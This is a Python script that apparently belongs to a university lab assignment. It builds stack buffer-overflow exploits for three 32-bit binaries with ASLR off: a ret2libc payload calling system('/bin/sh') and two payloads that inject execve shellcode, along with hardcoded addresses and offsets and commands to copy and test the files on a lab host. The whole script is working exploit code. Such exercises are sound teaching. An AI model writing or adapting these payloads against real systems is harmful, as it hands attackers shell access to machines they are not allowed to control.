import struct, os

# ── ADDRESSES — all from lab machine (10.16.13.53, Rocky Linux i686, TEMP=1000, ASLR off) ──
SYSTEM  = 0xb7dffd30   # p system in gdb on lab machine
BINSH   = 0xb7f40caa   # find &system, +99999999, "/bin/sh" on lab machine
FAKERET = 0xdeadbeef

# ── PER-BINARY PARAMETERS (from objdump -d display_file) ──
# bin.1: lea -0x2e(%ebp) → buf at ebp-46 → offset = 46+4 = 50 | GNU_STACK RW  → ret2libc
# bin.2: lea -0x30(%ebp) → buf at ebp-48 → offset = 48+4 = 52 | GNU_STACK RWE → shellcode
# bin.3: lea -0x2c(%ebp) → buf at ebp-44 → offset = 44+4 = 48 | GNU_STACK RWE → shellcode
# Break addr for GDB (right after call memcpy@plt): 0x804933c (same for all 3)

BIN2_BUF_ADDR = 0xbfffdbd8   # $ebp - 0x30 on lab machine
BIN3_BUF_ADDR = 0xbfffdbdc   # $ebp - 0x2c on lab machine

BASE = os.path.dirname(os.path.abspath(__file__))

def p32(v):
    return struct.pack('<I', v & 0xFFFFFFFF)

SHELLCODE = (
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'
    b'\x68\x2f\x62\x69\x6e\x89\xe3\x31'
    b'\xc9\x31\xd2\xb0\x0b\xcd\x80'
)  # execve("/bin//sh", NULL, NULL) — 23 bytes, no null bytes

def write_exploit(path, payload):
    with open(path, 'wb') as f:
        f.write(str(len(payload)).encode() + b' ' + payload)
    print(f"[+] wrote {path}  ({len(payload)} bytes payload)")

# bin.1 — ret2libc (offset=50)
r2l = b'A' * 50 + p32(SYSTEM) + p32(FAKERET) + p32(BINSH)
write_exploit(os.path.join(BASE, 'exploit.1'), r2l)

# bin.2 — shellcode injection (offset=52, buf=0xbfffdbd8)
sc2 = SHELLCODE + b'A' * (52 - len(SHELLCODE)) + p32(BIN2_BUF_ADDR)
write_exploit(os.path.join(BASE, 'exploit.2'), sc2)

# bin.3 — shellcode injection (offset=48, buf=0xbfffdbdc)
sc3 = SHELLCODE + b'A' * (48 - len(SHELLCODE)) + p32(BIN3_BUF_ADDR)
write_exploit(os.path.join(BASE, 'exploit.3'), sc3)

print()
print("[*] All exploit files generated.")
print("[*] Transfer to lab machine with:")
print("    scp -i ~/.ssh/lab_key exploit.1 exploit.2 exploit.3 apieri01@10.16.13.53:/home/students/cs/2024/apieri01/")
print("[*] Verify with:")
for n in [1, 2, 3]:
    print(f"    echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.{n} ./exploit.{n}")
